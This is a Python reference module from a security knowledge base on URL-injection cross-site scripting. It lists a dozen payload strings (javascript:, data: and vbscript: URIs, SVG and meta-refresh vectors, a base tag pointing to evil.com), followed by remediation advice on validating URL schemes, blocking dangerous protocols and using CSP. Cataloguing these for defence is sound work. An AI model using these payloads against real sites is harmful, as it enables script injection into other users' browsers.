#!/usr/bin/env python3
# Project: BRS-KB
# Company: EasyProTech LLC (www.easypro.tech)
# Dev: Brabus
# Date: 2025-12-27 UTC
# Status: Refactored
# Telegram: https://t.me/EasyProTech

"""
URL Injection XSS Context

XSS through URL manipulation, javascript: protocol handlers,
data: URIs, and URL parameter injection.
"""

DETAILS = {
    "title": "URL Injection XSS",
    "severity": "high",
    "cvss_score": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
    "reliability": "high",
    "cwe": ["CWE-79", "CWE-601"],
    "owasp": ["A03:2021"],
    "tags": ["url", "injection", "javascript", "protocol", "xss"],
    "description": """
URL Injection XSS exploits improper handling of URLs in href, src, action,
and other URL-accepting attributes. Attackers use javascript:, data:, and
vbscript: protocols to execute code when URLs are clicked or loaded.
""",
    "attack_vector": """
URL INJECTION XSS VECTORS:

1. JAVASCRIPT: PROTOCOL
   <a href="javascript:alert(1)">
   <img src="javascript:alert(1)">

2. DATA: URI
   <a href="data:text/html,<script>alert(1)</script>">
   <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

3. VBSCRIPT: (IE LEGACY)
   <a href="vbscript:msgbox(1)">

4. FRAGMENT INJECTION
   location.hash = '<img onerror=alert(1)>'
   Processed by client-side code

5. QUERY PARAMETER
   ?redirect=javascript:alert(1)

6. BASE TAG HIJACKING
   <base href="//evil.com/">
   All relative URLs point to attacker

7. SVG USE HREF
   <svg><use href="javascript:alert(1)">

8. LOCATION MANIPULATION
   location.href = userInput
   location.assign(userInput)
   location.replace(userInput)

9. WINDOW.OPEN()
   window.open(userUrl)

10. IFRAME SRC
    <iframe src="javascript:alert(1)">

11. FORM ACTION
    <form action="javascript:alert(1)">

12. META REFRESH
    <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
""",
    "remediation": """
URL INJECTION XSS PREVENTION:

1. VALIDATE URL SCHEME
   const url = new URL(input)
   if (!['http:', 'https:'].includes(url.protocol)) {
     throw new Error('Invalid protocol')
   }

2. USE URL CONSTRUCTOR
   try { new URL(input) } catch { /* invalid */ }

3. BLOCK DANGEROUS PROTOCOLS
   Block: javascript:, data:, vbscript:, blob:

4. SANITIZE BEFORE INSERTION
   Use DOMPurify or similar

5. CSP STRICT-DYNAMIC
   Content-Security-Policy: script-src 'strict-dynamic'

6. VALIDATE REDIRECTS
   Only allow same-origin redirects
   Whitelist allowed domains

7. ESCAPE IN ATTRIBUTES
   Use proper HTML escaping
""",
}
